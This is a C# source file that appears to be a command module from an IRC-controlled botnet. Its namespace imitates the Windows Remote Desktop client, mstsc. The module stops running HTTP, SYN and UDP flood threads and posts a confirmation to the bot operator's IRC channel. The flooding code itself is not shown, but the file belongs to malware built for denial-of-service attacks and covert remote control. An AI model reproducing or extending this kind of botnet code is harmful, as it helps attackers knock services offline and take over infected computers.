using System;

namespace mstsc.Aries.Commands.Flooders
{
    sealed class StopFlood
    {
        public StopFlood()
        {
            HTTP.StopHTTPFlood();
            SYN.StopSYNFlood();
            UDP.StopUDPFlood();
            try
            {
                Main.Instance.IRCClient.MessageCurrentChannel("{StopFlood} Stopped flooding threads");
            }
            catch (Exception)// err11)
            {
                //Main.Instance.IRCClient.MessageCurrentChannel("{StopFlood} An error has occurred:" + err11.Message);
            }
        }
    }
}
